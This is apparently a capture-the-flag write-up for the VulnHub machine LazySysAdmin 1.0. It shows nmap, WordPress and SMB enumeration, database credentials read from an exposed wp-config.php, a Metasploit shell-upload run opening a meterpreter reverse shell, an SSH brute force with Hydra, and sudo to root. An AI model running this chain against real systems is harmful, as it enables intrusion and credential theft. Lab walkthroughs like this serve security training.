# LazySysAdmin 1.0

URL: https://www.vulnhub.com/entry/lazysysadmin-1,205/

Level: Beginner - Intermediate

Date: 9 July 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [HTTP enumeration](#http-enumeration)
	- [Wordpress enumeration](#wordpress-enumeration)
	- [SMB](#smb)
- [Getting a shell](#getting-a-shell)
	- [msfconsole](#msfconsole)
	- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)
	- [sudo](#sudo)




## Reconnaissance

### nmap

```bash
$ sudo nmap -n -p- 10.0.2.7 -oA lazysys
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 00:58 CEST
Nmap scan report for 10.0.2.7
Host is up (0.00033s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
6667/tcp open  irc
MAC Address: 08:00:27:29:9C:96 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 4.10 seconds
```

### nmap verbose

```bash
$ sudo nmap -n -p80,139,445,3306,6667 -sV -sC 10.0.2.7 -oA lazysysverbose
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 01:01 CEST
Nmap scan report for 10.0.2.7
Host is up (0.00078s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-robots.txt: 4 disallowed entries
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-generator: Silex v2.2.7
|_http-title: Backnode
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info:
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 10.0.2.8
|_  error: Closing link: (nmap@10.0.2.8) [Client exited]
MAC Address: 08:00:27:29:9C:96 (Oracle VirtualBox virtual NIC)
Service Info: Hosts: LAZYSYSADMIN, Admin.local

Host script results:
|_clock-skew: mean: -3h20m00s, deviation: 5h46m24s, median: 0s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2023-07-09T09:01:54+10:00
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-07-08T23:01:54
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.73 seconds
```

### http enumeration

Let's take a look on path disallowed with `robots.txt`:

```bash
$ cat robots.txt
User-agent: *
Disallow: /old/
Disallow: /test/
Disallow: /TR2/
Disallow: /Backnode_files/
```

`/old`

![](Pasted%20image%2020230709093336.png)

`/test`


![](Pasted%20image%2020230709093404.png)

`/TR2`

![](Pasted%20image%2020230709093433.png)

`/Backnode_files`

![](Pasted%20image%2020230709093511.png)

### dirbusting with feroxbuster

```bash
$ feroxbuster -u http://10.0.2.7 -n -t 5 -L 1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferobuster.txt
200      GET      911l     1700w    36072c http://10.0.2.7/
301      GET        9l       28w      307c http://10.0.2.7/wordpress => http://10.0.2.7/wordpress/
301      GET        9l       28w      302c http://10.0.2.7/test => http://10.0.2.7/test/
301      GET        9l       28w      300c http://10.0.2.7/wp => http://10.0.2.7/wp/
301      GET        9l       28w      304c http://10.0.2.7/apache => http://10.0.2.7/apache/
301      GET        9l       28w      301c http://10.0.2.7/old => http://10.0.2.7/old/
301      GET        9l       28w      308c http://10.0.2.7/javascript => http://10.0.2.7/javascript/
301      GET        9l       28w      308c http://10.0.2.7/phpmyadmin => http://10.0.2.7/phpmyadmin/
403      GET       10l       30w      288c http://10.0.2.7/server-status
```

`/phpmyadmin`

![](Pasted%20image%2020230709103134.png)

`/wordpress`

![](Pasted%20image%2020230709103204.png)

We tried to register ourselves (username `sugo`, but we aren't able to receive email confirmation).

`/wp`

![](Pasted%20image%2020230709103225.png)

### wordpress enumeration

Version:

```bash
$ curl -s http://10.0.2.7/wordpress/ | grep WordPress
<meta name="generator" content="WordPress 4.8.22" />
                                                <a href="https://wordpress.org/">Proudly powered by WordPress</a>
```

Themes

```bash
$ curl -s http://10.0.2.7/wordpress/ | grep themes
        <script src="http://10.0.2.7/wordpress/wp-content/themes/twentyfifteen/js/html5.js"></script>
<link rel='stylesheet' id='genericons-css'  href='http://10.0.2.7/wordpress/wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2' type='text/css' media='all' />
<link rel='stylesheet' id='twentyfifteen-style-css'  href='http://10.0.2.7/wordpress/wp-content/themes/twentyfifteen/style.css?ver=4.8.22' type='text/css' media='all' />
<link rel='stylesheet' id='twentyfifteen-ie-css'  href='http://10.0.2.7/wordpress/wp-content/themes/twentyfifteen/css/ie.css?ver=20141010' type='text/css' media='all' />
<link rel='stylesheet' id='twentyfifteen-ie7-css'  href='http://10.0.2.7/wordpress/wp-content/themes/twentyfifteen/css/ie7.css?ver=20141010' type='text/css' media='all' />
<script type='text/javascript' src='http://10.0.2.7/wordpress/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010'></script>
<script type='text/javascript' src='http://10.0.2.7/wordpress/wp-content/themes/twentyfifteen/js/functions.js?ver=20150330'></script>
```

`wp-scan` run:

```bash
$ wpscan --url http://10.0.2.7/wordpress --enumerate --api-token vYvrH7HT2yKLSaLG5K51f6XXXXXXXXXXXXX
..
..
..
[+] XML-RPC seems to be enabled: http://10.0.2.7/wordpress/xmlrpc.php
[+] Registration is enabled: http://10.0.2.7/wordpress/wp-login.php?action=register
[+] Upload directory has listing enabled: http://10.0.2.7/wordpress/wp-content/uploads/[+] WordPress version 4.8.22 identified (Outdated, released on 2023-05-16).
[+] WordPress theme in use: twentyfifteen
[i] User(s) Identified:
[+] Admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Manual user enumeration: it seems we have two users

```
$ curl -s -I -X GET http://10.0.2.7/wordpress/?author=1
HTTP/1.1 200 OK
Date: Sun, 09 Jul 2023 13:01:52 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.22
Link: <http://10.0.2.7/wordpress/index.php?rest_route=/>; rel="https://api.w.org/"
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8


$ curl -s -I -X GET http://10.0.2.7/wordpress/?author=2
HTTP/1.1 200 OK
Date: Sun, 09 Jul 2023 13:02:02 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.22
Link: <http://10.0.2.7/wordpress/index.php?rest_route=/>; rel="https://api.w.org/"
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8


$ curl -s -I -X GET http://10.0.2.7/wordpress/?author=3
HTTP/1.1 404 Not Found
Date: Sun, 09 Jul 2023 13:02:15 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.22
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Link: <http://10.0.2.7/wordpress/index.php?rest_route=/>; rel="https://api.w.org/"
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```


```json
$ curl -s http://10.0.2.7/wordpress/?rest_route=/wp/v2/users | jq
[
  {
    "id": 1,
    "name": "Admin",
    "url": "http://www.sectalks.org",
    "description": "I like yogibear\r\nDo you like yogibear?",
    "link": "http://10.0.2.7/wordpress/?author=1",
    "slug": "admin",
    "avatar_urls": {
      "24": "http://1.gravatar.com/avatar/74c015d5a834c832273b66eaccce3a9e?s=24&d=mm&r=g",
      "48": "http://1.gravatar.com/avatar/74c015d5a834c832273b66eaccce3a9e?s=48&d=mm&r=g",
      "96": "http://1.gravatar.com/avatar/74c015d5a834c832273b66eaccce3a9e?s=96&d=mm&r=g"
    },
    "meta": [],
    "_links": {
      "self": [
        {
          "href": "http://10.0.2.7/wordpress/index.php?rest_route=/wp/v2/users/1"
        }
      ],
      "collection": [
        {
          "href": "http://10.0.2.7/wordpress/index.php?rest_route=/wp/v2/users"
        }
      ]
    }
  }
]
```

we can try to *brute force* ids:

```bash
$ curl -s http://10.0.2.7/wordpress/?rest_route=/wp/v2/users/2 | jq
{
  "code": "rest_user_cannot_view",
  "message": "Sorry, you are not allowed to list users.",
  "data": {
    "status": 401
  }
}
```

id 3 seems not present:

```bash
$ curl -s http://10.0.2.7/wordpress/?rest_route=/wp/v2/users/3 | jq
{
  "code": "rest_user_invalid_id",
  "message": "Invalid user ID.",
  "data": {
    "status": 404
  }
}
```

Try brute force usernames with `wpscan`:

```bash
$ wpscan -e u1-100 --url http://10.0.2.7/wordpress
...
...
...
[i] User(s) Identified:

[+] View all posts by Admin
 | Found By: Author Posts - Display Name (Passive Detection)

[+] Admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Nothing new so far. Let's move to another service for now.


### SMB

```bash
$ smbclient -L \\10.0.2.7
Password for [WORKGROUP\joshua]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        share$          Disk      Sumshare
        IPC$            IPC       IPC Service (Web server)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAZYSYSADMIN
```

It seems we are able to mount `share$`

```bash
$ smbclient \\\\10.0.2.7\\share$
Password for [WORKGROUP\joshua]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Aug 15 13:05:52 2017
  ..                                  D        0  Mon Aug 14 14:34:47 2017
  wordpress                           D        0  Sun Jul  9 13:21:01 2023
  Backnode_files                      D        0  Mon Aug 14 14:08:26 2017
  wp                                  D        0  Tue Aug 15 12:51:23 2017
  deets.txt                           N      139  Mon Aug 14 14:20:05 2017
  robots.txt                          N       92  Mon Aug 14 14:36:14 2017
  todolist.txt                        N       79  Mon Aug 14 14:39:56 2017
  apache                              D        0  Mon Aug 14 14:35:19 2017
  index.html                          N    36072  Sun Aug  6 07:02:15 2017
  info.php                            N       20  Tue Aug 15 12:55:19 2017
  test                                D        0  Mon Aug 14 14:35:10 2017
  old                                 D        0  Mon Aug 14 14:35:13 2017

                3029776 blocks of size 1024. 1381036 blocks available
smb: \>
```

We focus on `wp-config.php`, as we now that there is `/phpmyadmin` exposed

```bash
smb: \> cd wordpress
smb: \wordpress\> dir
  .                                   D        0  Sun Jul  9 13:21:01 2023
  ..                                  D        0  Tue Aug 15 13:05:52 2017
  wp-config-sample.php                N     2853  Wed Dec 16 10:58:26 2015
  wp-trackback.php                    N     4582  Sun Jul  9 10:31:51 2023
  wp-admin                            D        0  Wed Aug  2 23:02:02 2017
  wp-settings.php                     N    16200  Thu Apr  6 20:01:42 2017
  wp-blog-header.php                  N      364  Sat Dec 19 12:20:28 2015
  index.php                           N      418  Wed Sep 25 02:18:11 2013
  wp-cron.php                         N     3286  Sun May 24 19:26:25 2015
  wp-links-opml.php                   N     2422  Mon Nov 21 03:46:30 2016
  readme.html                         N     7413  Sun Jul  9 10:31:52 2023
  wp-signup.php                       N    29924  Tue Jan 24 12:08:42 2017
  wp-content                          D        0  Sun Jul  9 10:31:50 2023
  license.txt                         N    19935  Sun Jul  9 10:31:52 2023
  wp-mail.php                         N     8002  Sun Jul  9 10:31:52 2023
  wp-activate.php                     N     6864  Sun Jul  9 10:31:52 2023
  .htaccess                           H       35  Tue Aug 15 13:40:13 2017
  xmlrpc.php                          N     3065  Wed Aug 31 18:31:29 2016
  wp-login.php                        N    34347  Sun Jul  9 10:31:52 2023
  wp-load.php                         N     3301  Tue Oct 25 05:15:30 2016
  wp-comments-post.php                N     1627  Mon Aug 29 14:00:32 2016
  wp-config.php                       N     3703  Mon Aug 21 11:25:14 2017
  wp-includes                         D        0  Wed Aug  2 23:02:03 2017

                3029776 blocks of size 1024. 1381036 blocks available
smb: \wordpress\> get wp-config.php
getting file \wordpress\wp-config.php of size 3703 as wp-config.php (1808.0 KiloBytes/sec) (average 1808.1 KiloBytes/sec)
```

```bash
$ egrep '(DB_USER|DB_PASS)' wp-config.php
define('DB_USER', 'Admin');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
```

We are not allowed to access MySQL from network:

```bash
$ mysql -uAdmin -p -h 10.0.2.7
Enter password:
ERROR 1130 (HY000): Host '10.0.2.8' is not allowed to connect to this MySQL server
```

Thanks to phpMyAdmin, we are in!

![](Pasted%20image%2020230709152636.png)

By looking at database, we have no other users around:

```bash
INSERT INTO `wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES
(1, 'Admin', '$P$B.LCmtO3gkm0PdZNkBwgz2HQweq2Ur0', 'admin', 'togie@sectalks.org', 'http://www.sectalks.org', '2017-08-15 11:20:50', '', 0, 'Admin'),
(2, 'sugo', '$P$BirE6VT8MtB7d9T.zmkzEGeRX9HNd31', 'sugo', 'sugo@olografix.org', '', '2023-07-09 08:51:26', '1688892687:$P$BFPpOhfDwitieS56eAThvHH/29DJXY0', 0, 'sugo');
```

We also discover that same credentials are valid for Wordpress login!

![](Pasted%20image%2020230709153426.png)

## getting a shell

Since we are lazy :) we use `msfconsole`

```bash
msf6 > search shell_upload

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/moodle_admin_shell_upload   2019-04-28       excellent  Yes    Moodle Admin Shell Upload
   1  exploit/unix/webapp/wp_admin_shell_upload      2015-02-21       excellent  Yes    WordPress Admin Shell Upload
   2  exploit/unix/webapp/wp_symposium_shell_upload  2014-12-11       excellent  Yes    WordPress WP Symposium 14.11 Shell Upload


Interact with a module by name or index. For example info 2, use 2 or use exploit/unix/webapp/wp_symposium_shell_upload

msf6 > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
```

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD TogieMYSQL12345^^
PASSWORD => TogieMYSQL12345^^
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME Admin
USERNAME => Admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.0.2.7
RHOSTS => 10.0.2.7
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.0.2.8:4444
[*] Authenticating with WordPress using Admin:TogieMYSQL12345^^...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/aeauTPBwoC/XdEsudHOXu.php...
[*] Sending stage (39927 bytes) to 10.0.2.7
[+] Deleted XdEsudHOXu.php
[+] Deleted aeauTPBwoC.php
[+] Deleted ../aeauTPBwoC
[*] Meterpreter session 1 opened (10.0.2.8:4444 -> 10.0.2.7:59078) at 2023-07-09 15:37:47 +0200

meterpreter >
```

better shell

```bash
meterpreter > shell
Process 8161 created.
Channel 0 created.
sh: 0: getcwd() failed: No such file or directory
sh: 0: getcwd() failed: No such file or directory
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python
sh: 0: getcwd() failed: No such file or directory
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash");'
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@LazySysAdmin:$
```

### lateral movement

```bash
www-data@LazySysAdmin:/$ ls /home
ls /home
togie
www-data@LazySysAdmin:/$ id togie
id togie
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)

```

We know that `togie` is a valid system user.

Maybe we can access with that login.

```bash
www-data@LazySysAdmin:/home/togie$ ls -la
ls -la
total 24
drwxr-xr-x 3 togie togie 4096 Aug 15  2017 .
drwxr-xr-x 3 root  root  4096 Aug 14  2017 ..
-rw-r--r-- 1 togie togie  220 Aug 14  2017 .bash_logout
-rw-r--r-- 1 togie togie 3637 Aug 14  2017 .bashrc
drwx------ 2 togie togie 4096 Aug 14  2017 .cache
-rw-r--r-- 1 togie togie  675 Aug 14  2017 .profile
```

Let's try again with the SAME password.

```bash
$ ssh togie@10.0.2.7
The authenticity of host '10.0.2.7 (10.0.2.7)' can't be established.
ED25519 key fingerprint is SHA256:95rO1jtge1Ag8dmmSGET2f806aQjiTODoBpDoEeefaw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.7' (ED25519) to the list of known hosts.
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         #
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   #
##################################################################################################

togie@10.0.2.7's password:
Permission denied, please try again.
togie@10.0.2.7's password:
```

No luck.

Let's try brute force with `Hydra`

```bash
$ hydra -l togie -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.7
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-09 15:44:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.0.2.7:22/
[22][ssh] host: 10.0.2.7   login: togie   password: 12345
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-09 15:44:23
```

We are in:

```bash
$ ssh togie@10.0.2.7
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         #
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   #
##################################################################################################

togie@10.0.2.7's password:
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

 System information disabled due to load higher than 1.0

133 packages can be updated.
0 updates are security updates.

New release '16.04.7 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

togie@LazySysAdmin:~$
```

## privilege escalation

Trivial

```bash
togie@LazySysAdmin:~$ sudo -l
[sudo] password for togie:
Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
togie@LazySysAdmin:~$ sudo bash
root@LazySysAdmin:~# id
uid=0(root) gid=0(root) groups=0(root)
```

